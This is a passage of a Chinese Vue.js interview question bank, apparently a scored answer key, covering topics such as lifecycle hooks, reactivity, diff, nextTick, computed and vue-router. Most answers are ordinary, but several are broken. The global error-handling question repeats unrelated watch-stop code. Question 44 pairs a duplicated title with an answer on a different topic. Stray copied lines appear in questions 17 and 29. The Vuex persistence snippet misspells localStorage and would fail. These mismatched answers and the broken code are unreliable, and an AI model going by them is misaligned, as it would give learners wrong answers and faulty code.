些公共封装，可以有效减少我们的代码量，而且更容易维护资源优化</p>\\n</li>\\n<li><p>图片懒加载：使用图片懒加载可以优化同一时间减少 http 请求开销，避免显示图片导致的画面抖动，提高用户体验</p>\\n</li>\\n<li><p>使用 svg 图标：相对于用一张图片来表示图标，svg 拥有更好的图片质量，体积更小，并且不需要开启额外的 http 请求</p>\\n</li>\\n</ul>\\n<h2>16. 组件中写 name 选项有哪些好处？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>可以通过名字找到对应的组件（ 递归组件：组件自身调用自身 ）</p>\\n</li>\\n<li><p>可以通过 name 属性实现缓存功能（keep-alive）</p>\\n</li>\\n<li><p>可以通过 name 来识别组件（跨级组件通信时非常重要）</p>\\n</li>\\n<li><p>使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的</p>\\n</li>\\n</ul>\\n<h2>17. 说一下 ref 的作用是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<p>ref 的作用是被用来给元素或子组件注册引用信息。引用信息将会注册在父组件的 $refs 对象上。其特点是：</p>\\n<ul>\\n<li><p>如果在普通的 DOM 元素上使用，引用指向的就是 DOM 元素</p>\\n</li>\\n<li><p>基本用法，本页面获取 DOM 元素</p>\\n</li>\\n<li><p>获取子组件中的 data</p>\\n</li>\\n<li><p>调用子组件中的方法</p>\\n</li>\\n<li><p>使用 vue-devtools 调试工具里显示的组见名称是由 vue 中组件 name 决定的</p>\\n</li>\\n</ul>\\n<h2>18. 谈谈你对 Vue 3 Composition API 中响应式原理的理解，以及它与 Vue 2.x 中响应式原理的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3分）</h4>\\n<ul>\\n<li><strong>1：</strong> Vue 3 使用 ES6 的 Proxy 对象来实现响应式，它可以直接代理整个对象，而不仅仅是对象的属性。例如：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const state = reactive({ count: 0 });\\n//Proxy 能对对象的所有操作进行拦截，包括属性的读取、设置、删除等，从而实现更精准的响应式追踪。\\n</code></pre>\\n<ul>\\n<li><strong>1：</strong> 对比 Vue 2.x 使用的 Object.defineProperty () 方法，它只能对对象的已有属性进行逐个劫持，对于新增属性需要使用Vue.set方法来手动触发响应式更新。</li>\\n<li><strong>1：</strong> 在 Vue 3 中，通过reactive创建的响应式对象是深层响应式的，而 Vue 2.x 中对象内部嵌套的对象，需要递归遍历进行深度响应式转换。</li>\\n</ul>\\n<h2>19. 在 Vue 3 项目中，如何进行 SSR（服务器端渲染）</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3分）</h4>\\n<ul>\\n<li><strong>0：</strong> 搭建项目基础：创建 Vue 3 项目，可使用@vue/cli工具，通过命令vue create my-ssr-app创建项目，选择相关 Vue 3 选项。</li>\\n<li><strong>1：</strong> 添加 SSR 相关依赖：安装<code>@vue/server-renderer</code>和<code>express</code>等依赖，<code>@vue/server-renderer</code>用于服务器端渲染，<code>express</code>作为服务器框架。命令\\n为<code>npm install @vue/server-renderer express</code>。</li>\\n<li><strong>1：</strong> 创建服务器文件：在项目根目录下创建server.js文件，用于创建服务器和处理 SSR 逻辑。在文件中，引入express，创建服务器实例，设置路由，使\\n用@vue/server-renderer将 Vue 组件渲染为 HTML 字符串并返回。</li>\\n<li><strong>1：</strong> 调整 Vue 项目代码：在 Vue 项目中，需要创建一个用于服务器端渲染的入口文件，如<code>entry-server.js</code>，在该文件中，创建 Vue 应用实例，并导出。同时，可能\\n需要调整一些组件的逻辑，以适应服务器端渲染的环境。</li>\\n</ul>\\n<h2>20. Vue 3中的Suspense组件的作用是什么，它是如何工作的？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><strong>1：</strong> Suspense是在vue3中新提供的，用来处理异步组件的加载状态。</li>\\n<li><strong>1：</strong> Suspense 组件允许你指定一个加载中的状态<code>（fallback）</code>和一个加载失败的状态<code>（fallback slot）</code>，用于处理异步组件的加载状态。当异步组件加载时，会先显示加载中\\n的状态；加载完成后，会显示异步组件；如果加载失败，会显示加载失败的状态。</li>\\n</ul>\\n<h2>21. vue的生命周期有哪些及每个生命周期做了什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3分）</h4>\\n<ul>\\n<li><p>beforeCreate是new Vue()之后触发的第一个钩子，在当前阶段data、methods、computed以及watch上的数据和方法都不能被访问。</p>\\n</li>\\n<li><p>created是实例创建完成后触发的钩子，当前阶段已经完成了数据观测、属性和方法的运算，watch/event事件回调。然而，挂载阶段还没开始，$el属性目前不可见。</p>\\n</li>\\n<li><p>beforeMount是挂载开始之前被触发的钩子，相关的render函数首次被调用。该钩子在服务器端渲染期间不被调用。</p>\\n</li>\\n<li><p>mounted是el被新创建的vm.$el替换，并挂载到实例上去之后调用该钩子。如果根实例挂载到一个文档内元素上，当mounted被调用时vm.$el也在文档内。该钩子在服务器端渲染期间不被调用。</p>\\n</li>\\n<li><p>beforeUpdate是数据更新时调用，发生在虚拟DOM重新渲染和打补丁之前。你可以在这个钩子中进一步地更改状态，这不会触发附加的重渲染过程。</p>\\n</li>\\n<li><p>updated是由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。当这个钩子被调用时，组件DOM已经更新，所以你现在可以执行依赖于DOM的操作。然而请注意，在大多数情况下，你应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。</p>\\n</li>\\n<li><p>beforeDestroy是实例销毁之前调用。在这一步，实例仍然完全可用。</p>\\n</li>\\n<li><p>destroyed是Vue 实例销毁后调用。调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务器端渲染期间不被调用。</p>\\n</li>\\n</ul>\\n<h2>22. vue响应式原理是什么？vue3的响应式有何不同?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><p>Vue在初始化数据时，会使用Object.defineProperty重新定义data中的所有属性，当页面使用对应属性时，首先会进行依赖收集(收集当前组件的watcher)如果属性发生变化会通知相关依赖进行更新操作(发布订阅)。</p>\\n</li>\\n<li><p>Vue3.x改用Proxy替代Object.defineProperty。因为Proxy可以直接监听对象和数组的变化，并且有多达13种拦截方法。并且作为新标准将受到浏览器厂商重点持续的性能优化。</p>\\n</li>\\n</ul>\\n<h2>23. 谈一谈对 MVVM 的理解？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li>MVVM是Model-View-ViewModel缩写，也就是把MVC中的Controller演变成ViewModel。Model层代表数据模型，View代表UI组件，ViewModel是View和Model层的桥梁，数据会绑定到viewModel层并自动将数据渲染到页面中，视图变化的时候会通知viewModel层更新数据.</li>\\n</ul>\\n<h2>24. vue2.x 和 vuex3.x 渲染器的 diff 算法分别说一下？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>简单来说，diff算法有以下过程</p>\\n<ul>\\n<li><p>同级比较，再比较子节点</p>\\n</li>\\n<li><p>先判断一方有子节点一方没有子节点的情况(如果新的children没有子节点，将旧的子节点移除)</p>\\n</li>\\n<li><p>比较都有子节点的情况(核心diff)</p>\\n</li>\\n<li><p>递归比较子节点</p>\\n</li>\\n</ul>\\n<p>Vue2的核心Diff算法采用了双端比较的算法，同时从新旧children的两端开始进行比较，借助key值找到可复用的节点，再进行相关操作。相比React的Diff算法，同样情况下可以减少移动节点次数，减少不必要的性能损耗，更加的优雅。</p>\\n<p>Vue3.x借鉴了 ivi算法和 inferno算法</p>\\n<p>在创建VNode时就确定其类型，以及在mount/patch的过程中采用位运算来判断一个VNode的类型，在这个基础之上再配合核心的Diff算法，使得性能上较Vue2.x有了提升。(实际的实现可以结合Vue3.x源码看。)</p>\\n<h2>25. vue 组件通信方式有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>父子组件通信</p>\\n<p>父-&gt;子props，子-&gt;父 $on、$emit</p>\\n<p>获取父子组件实例 $parent、$children</p>\\n<p>Ref 获取实例的方式调用组件的属性或者方法</p>\\n<p>Provide、inject 官方不推荐使用，但是写组件库时很常用</p>\\n<p>兄弟组件通信</p>\\n<p>Event Bus 实现跨组件通信，代码繁琐，不推荐</p>\\n<p>Vuex 官方推荐使用，功能强大，vue-devtools有插件支持</p>\\n<h2>26. Vue的路由实现, hash路由和history路由实现原理说一下？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p><code>location.hash</code>的值实际就是URL中<code>#</code>后面的东西。</p>\\n<p>history实际采用了HTML5中提供的API来实现，主要有history.pushState()和history.replaceState()。</p>\\n<h2>27. keep-alive的常用属性有哪些及实现原理</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>keep-alive可以实现组件缓存，当组件切换时不会对当前组件进行卸载。</p>\\n<p>常用的两个属性include/exclude，允许组件有条件的进行缓存。</p>\\n<p>两个生命周期activated/deactivated，用来得知当前组件是否处于活跃状态。</p>\\n<p>keep-alive的中还运用了LRU(Least Recently Used)算法。</p>\\n<h2>28. nextTick 的作用是什么？他的实现原理是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>在下次 DOM 更新循环结束之后执行延迟回调。nextTick主要使用了宏任务和微任务。根据执行环境分别尝试采用</p>\\n<ul>\\n<li><p>Promise</p>\\n</li>\\n<li><p>MutationObserver</p>\\n</li>\\n<li><p>setImmediate</p>\\n</li>\\n<li><p>setTimeout</p>\\n</li>\\n</ul>\\n<p>定义了一个异步方法，多次调用nextTick会将方法存入队列中，通过这个异步方法清空当前队列。</p>\\n<h2>29. 说一下 Vue 的 computed 的实现原理</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3分）</h4>\\n<p>当组件实例触发生命周期函数 beforeCreate 后，它会做一系列事情，其中就包括对 computed 的处理。</p>\\n<p>它会遍历 computed 配置中的所有属性，为每一个属性创建一个 Watcher 对象，并传入一个函数，该函数的本质其实就是 computed 配置中的 getter，这样一来，getter 运行过程中就会收集依赖</p>\\n<p>但是和渲染函数不同，为计算属性创建的 Watcher 不会立即执行，因为要考虑到该计算属性是否会被渲染函数使用，如果没有使用，就不会得到执行。因此，在创建 Watcher 的时候，它使用了 lazy 配置，lazy 配置可以让 Watcher 不会立即执行。</p>\\n<p>收到 lazy 的影响，Watcher 内部会保存两个关键属性来实现缓存，一个是 value，一个是 dirty</p>\\n<p>value 属性用于保存 Watcher 运行的结果，受 lazy 的影响，该值在最开始是 undefined</p>\\n<p>dirty 属性用于指示当前的 value 是否已经过时了，即是否为脏值，受 lazy 的影响，该值在最开始是 true</p>\\n<p>定义了一个异步方法，多次调用nextTick会将方法存入队列中，通过这个异步方法清空当前队列。</p>\\n<p>Watcher 创建好后，vue 会使用代理模式，将计算属性挂载到组件实例中</p>\\n<p>当读取计算属性时，vue 检查其对应的 Watcher 是否是脏值，如果是，则运行函数，计算依赖，并得到对应的值，保存在 Watcher 的 value 中，然后设置 dirty 为 false，然后返回。</p>\\n<p>如果 dirty 为 false，则直接返回 watcher 的 value</p>\\n<p>巧妙的是，在依赖收集时，被依赖的数据不仅会收集到计算属性的 Watcher，还会收集到组件的 Watcher</p>\\n<p>当计算属性的依赖变化时，会先触发计算属性的 Watcher 执行，此时，它只需设置 dirty 为 true 即可，不做任何处理。</p>\\n<p>由于依赖同时会收集到组件的 Watcher，因此组件会重新渲染，而重新渲染时又读取到了计算属性，由于计算属性目前已为 dirty，因此会重新运行 getter 进行运算</p>\\n<p>而对于计算属性的 setter，则极其简单，当设置计算属性时，直接运行 setter 即可。</p>\\n<h2>30. 说一下 Vue complier 的实现原理是什么样的？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3分）</h4>\\n<p>complier 的主要作用是解析模板，生成渲染模板的 render， 而 render 的作用主要是为了生成 VNode</p>\\n<p>complier 主要分为 3 大块：</p>\\n<ul>\\n<li><p>parse：接受 template 原始模板，按着模板的节点和数据生成对应的 ast</p>\\n</li>\\n<li><p>optimize：遍历 ast 的每一个节点，标记静态节点，这样就知道哪部分不会变化，于是在页面需要更新时，通过 diff 减少去对比这部分DOM，提升性能</p>\\n</li>\\n<li><p>generate 把前两步生成完善的 ast，组成 render 字符串，然后将 render 字符串通过 new Function 的方式转换成渲染函数</p>\\n</li>\\n</ul>\\n<h2>31. 说一下 watch 与 computed 的区别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><p>都是观察数据变化的（相同）</p>\\n</li>\\n<li><p>计算属性将会混入到 vue 的实例中，所以需要监听自定义变量；watch 监听 data 、props 里面数据的变化</p>\\n</li>\\n<li><p>computed 有缓存，它依赖的值变了才会重新计算，watch 没有；</p>\\n</li>\\n<li><p>watch 支持异步，computed 不支持；</p>\\n</li>\\n<li><p>watch 是一对多（监听某一个值变化，执行对应操作）；computed 是多对一（监听属性依赖于其他属性）</p>\\n</li>\\n<li><p>watch 监听函数接收两个参数，第一个是最新值，第二个是输入之前的值；</p>\\n</li>\\n<li><p>omputed 属性是函数时，都有 get 和 set 方法，默认走 get 方法，get 必须有返回值（return）</p>\\n</li>\\n</ul>\\n<h2>32. 说一下你知道的 vue 修饰符都有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>事件修饰符</p>\\n<ul>\\n<li><p>.stop：阻止冒泡。</p>\\n</li>\\n<li><p>.prevent：阻止默认事件。</p>\\n</li>\\n<li><p>.capture：使用事件捕获模式。</p>\\n</li>\\n<li><p>.self：只在当前元素本身触发。</p>\\n</li>\\n<li><p>once：只触发一次。</p>\\n</li>\\n<li><p>passive：默认行为将会立即触发。</p>\\n</li>\\n</ul>\\n<p>按键修饰符</p>\\n<ul>\\n<li><p>.left：左键</p>\\n</li>\\n<li><p>.right：右键</p>\\n</li>\\n<li><p>.middle：滚轮</p>\\n</li>\\n<li><p>.enter：回车</p>\\n</li>\\n</ul>\\n<p>表单修饰符</p>\\n<ul>\\n<li><p>.lazy：在文本框失去焦点时才会渲染</p>\\n</li>\\n<li><p>.number：将文本框中所输入的内容转换为number类型</p>\\n</li>\\n<li><p>.trim：可以自动过滤输入首尾的空格</p>\\n</li>\\n</ul>\\n<h2>33. 怎么理解Vue的单向数据流？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>单向数据流是指：数据在组件树中的流动方向，是从父组件流向子组件的。这个设计使得数据流更加可预测和易于调试，确保应用状态的一致性。</p>\\n<p>简单理解：父组件的状态对于子组件是只读的，子组件想改，只能通过事件的方式，通知父组件自己改。</p>\\n<h2>34. Vue中怎么异步加载组件</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<pre><code class=\\"language-js\\">&lt;template&gt; \\n    &lt;MyComponent /&gt; \\n&lt;/template&gt;\\n&lt;script setup&gt;\\nimport { defineAsyncComponent } from &#39;vue&#39;\\n\\nconst MyComponent = defineAsyncComponent(() =&gt;\\n  import(&#39;./components/MyComponent.vue&#39;)\\n)\\n&lt;/script&gt;\\n</code></pre>\\n<h2>35. 为什么this.xx可以访问data中的数据?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>Vue在initData时，做了数据代理</p>\\n<ul>\\n<li><p>判断传入的data，函数就执行，对象不做处理</p>\\n</li>\\n<li><p>data 赋值给 vm._data</p>\\n</li>\\n<li><p>然后变量 vm._data对象，把可枚举属性的get代理到 vm上</p>\\n</li>\\n<li><p>访问vm.xxx 就相当于 vm._data.xx === vm.data.xx</p>\\n</li>\\n</ul>\\n<h2>36. 父组件如何监听子组件生命周期？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>vue2 使用 @hook:mounted</p>\\n<p>vue3 使用 @vue:mounted</p>\\n<p>自定义事件，在子组件生命周期中去执行 下面是vue3的写法</p>\\n<pre><code class=\\"language-js\\">\\n&lt;template&gt;\\n  &lt;h1 @click=&quot;send&quot;&gt;Home 页面&lt;/h1&gt;\\n  &lt;Text @vue:mounted=&quot;fn&quot; /&gt;\\n&lt;/template&gt;\\n\\n&lt;script setup&gt;\\nimport { onMounted, ref } from &#39;vue&#39;\\nimport Text from &#39;../components/Text.vue&#39;\\nconst fn = () =&gt; {\\n  console.log(&#39;Text mounted&#39;)\\n}\\n&lt;/script&gt;\\n</code></pre>\\n<h2>37. watch怎么停止监听？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<pre><code class=\\"language-js\\">import { ref, watch } from &#39;vue&#39;\\nconst count = ref(0)\\nconst soptWatch = watch(() =&gt; count.value, (newVal, oldVal) =&gt; {\\n  console.log(newVal, oldVal)\\n})\\nsoptWatch()\\n</code></pre>\\n<h2>37. Vue中怎么做全局错误监听？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<pre><code class=\\"language-js\\">import { ref, watch } from &#39;vue&#39;\\nconst count = ref(0)\\nconst soptWatch = watch(() =&gt; count.value, (newVal, oldVal) =&gt; {\\n  console.log(newVal, oldVal)\\n})\\nsoptWatch()\\n</code></pre>\\n<h2>38. 怎么监听子组件内的错误？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<pre><code class=\\"language-js\\">// 子组件\\nthrow new Error(&quot;Error&quot;);\\n\\n//父组件\\nimport { onErrorCaptured } from &#39;vue&#39;\\n\\n// 监听到子组件错误，执行回调\\nonErrorCaptured((err) =&gt; {\\n  console.log(&#39;error&#39;, err)\\n})\\n</code></pre>\\n<h2>38. vue-router怎么动态添加、删除路由？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>添加路由</p>\\n<pre><code class=\\"language-js\\">\\nimport { useRouter } from &#39;vue-router&#39;;\\n\\nconst router = useRouter();\\nconst addRoute = () =&gt; {\\n  const newRoute = {\\n    path: &#39;/hello&#39;, name: &#39;hello&#39;, component: () =&gt; import(&#39;../components/HelloWorld.vue&#39;), // 动态加载组件\\n  };\\n  router.addRoute(newRoute);\\n};\\n</code></pre>\\n<p>添加路由</p>\\n<pre><code class=\\"language-js\\">\\nrouter.removeRoute(&#39;xxx&#39;);\\n</code></pre>\\n<h2>39. 有使用过v-memo么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>缓存一个模板的子树。在元素和组件上都可以使用。为了实现缓存，该指令需要传入一个固定长度的依赖值数组进行比较。如果数组里的每个值都与最后一次的渲染相同，那么整个子树的更新将被跳过。</p>\\n<p>一般与v-for配合使用，v-memo的值是一个数组。数组的值不改变的情况，该组件及子组件就会跳过更新</p>\\n<p>v-memo 绑定的值没改变，子组件引用的响应数据变了，也不会更新</p>\\n<h2>40. v-for 中 key 的作用是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>key 是 Vue 使用 v-for 渲染列表时的节点标识。使用了 key 之后，当列表项发生变化时，Vue 会基于 key 的变化而重新排列元素顺序，并且移除 key 不存在的元素，提升运行效率。</p>\\n<h2>40. 如何动态更新对象或数组的值？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>  因为 Object.defineProperty()的限制，Vue 无法监听到对象或数组内部某个属性值的变化，因此在直接设置以上两类数据的值时，页面不会实时更新。此时可以通过 this.$set 方法来解决：</p>\\n<h2>41. v-on 如何绑定多个事件？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<pre><code class=\\"language-js\\">&lt;!--单事件绑定--&gt;\\n&lt;input type=&quot;text&quot; @click=&quot;onClick&quot;&gt;\\n&lt;!--多事件绑定--&gt;\\n&lt;input type=&quot;text&quot; v-on=&quot;{ input:onInput,focus:onFocus,blur:onBlur }&quot;&gt;\\n</code></pre>\\n<h2>41. Vue 初始化页面闪动问题如何解决？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<p>出现该问题是因为在 Vue 代码尚未被解析之前，尚无法控制页面中 DOM 的显示，所以会看见模板字符串等代码。</p>\\n<p>解决方案是，在 css 代码中添加 v-cloak 规则，同时在待编译的标签上添加 v-cloak 属性：</p>\\n<pre><code class=\\"language-html\\">[v-cloak] { display: none; }\\n\\n&lt;div v-cloak&gt;\\n  {{ message }}\\n&lt;/div&gt;\\n</code></pre>\\n<h2>42. Vue 如何清除浏览器缓存？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><p>项目打包的时候给每个打包文件加上 hash 值，一般是在文件后面加上时间戳；</p>\\n</li>\\n<li><p>在 html 文件中加入 meta 标签，content 属性设置为no-cache;</p>\\n</li>\\n<li><p>在后端服务器中进行禁止缓存设置。</p>\\n</li>\\n</ul>\\n<h2>43. 页面刷新了之后vuex中的数据消失怎么解决</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1分）</h4>\\n<ul>\\n<li><p>vuex数据位于内存, 页面的刷新重置会导致数据的归零,也就是所谓的消失, 本地持久化可以解决这个问题.本地持久化用到的技术也就是 本次存储 sesstionStorage 或者 localStorage</p>\\n</li>\\n<li><p>tate的持久化 也就是分别需要在 state数据初始化 /更新 的时候 进行读取和设置本地存储操作</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\">  export default new Vuex.store({\\n   state: {\\n       user: localStorge.getItem(&#39;user&#39;)  // 初始化时读取 本地存储\\n   },\\n   mutations: {\\n       updateUser (state, payload) {\\n           state.user = payload.user\\n           localStoregae.setItem(&#39;user&#39;,payload.user) // 数据更新时 设置本地存储\\n       }\\n   }\\n})\\n</code></pre>\\n<h2>44. 页面刷新了之后vuex中的数据消失怎么解决</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><p>在对一些属性进行操作时，使用这种方法无法拦截，比如通过下标方式修改数组数据或者给对象新增属性，这都不能触发组件的重新渲染，因为 Object.defineProperty 不能拦截到这些操作。更精确的来说，对于数组而言，大部分操作都是拦截不到的，只是 Vue 内部通过重写函数的方式解决了这个问题。</p>\\n</li>\\n<li><p>在 Vue3.0 中已经不使用这种方式了，而是通过使用 Proxy 对对象进行代理，从而实现数据劫持。使用Proxy 的好处是它可以完美的监听到任何方式的数据改变，唯一的缺点是兼容性的问题，因为 Proxy 是 ES6 的语法。</p>\\n</li>\\n</ul>\\n<h2>45. assets和static的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><p>相同点： assets 和 static 两个都是存放静态资源文件。项目中所需要的资源文件图片，字体图标，样式文件等都可以放在这两个文件下</p>\\n</li>\\n<li><p>不相同点：assets 中存放的静态资源文件在项目打包时，也就是运行 npm run build 时会将 assets 中放置的静态资源文件进行打包上传，所谓打包简单点可以理解为压缩体积，代码格式化。而压缩后的静态资源文件最终也都会放置在 static 文件中跟着 index.html 一同上传至服务器。static 中放置的静态资源文件就不会要走打包压缩格式化等流程，而是直接进入打包好的目录，直接上传至服务器。</p>\\n</li>\\n</ul>\\n<p>因为避免了压缩直接进行上传，在打包时会提高一定的效率，但是 static 中的资源文件由于没有进行压缩等操作，所以文件的体积也就相对于 assets 中打包后的文件提交较大点。在服务器中就会占据更大的空间</p>\\n<h2>46. delete和Vue.delete删除数组的区别</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><p>delete 只是被删除的元素变成了 empty/undefined 其他的元素的键值还是不变。</p>\\n</li>\\n<li><p>Vue.delete 直接删除了数组 改变了数组的键值。</p>\\n</li>\\n</ul>\\n<h2>47. 什么是 mixin？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<ul>\\n<li><p>Mixin 使我们能够为 Vue 组件编写可插拔和可重用的功能。</p>\\n</li>\\n<li><p>如果希望在多个组件之间重用一组组件选项，例如生命周期 hook、 方法等，则可以将其编写为 mixin，并在组件中简单的引用它。</p>\\n</li>\\n<li><p>然后将 mixin 的内容合并到组件中。如果你要在 mixin 中定义生命周期 hook，那么它在执行时将优化于组件自已的 hook。</p>\\n</li>\\n</ul>\\n<h2>48. 对 SPA 单页面的理解，它的优缺点分别是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2分）</h4>\\n<p>SPA（ single-page application ）仅在 Web 页面初始化时加载相应的 HTML、JavaScript 和 CSS。一旦页面加载完成，SPA 不会因为用户的操作而进行页面的重新加载或跳转；取而代之的是利用路由机制实现 HTML 内容的变换，UI 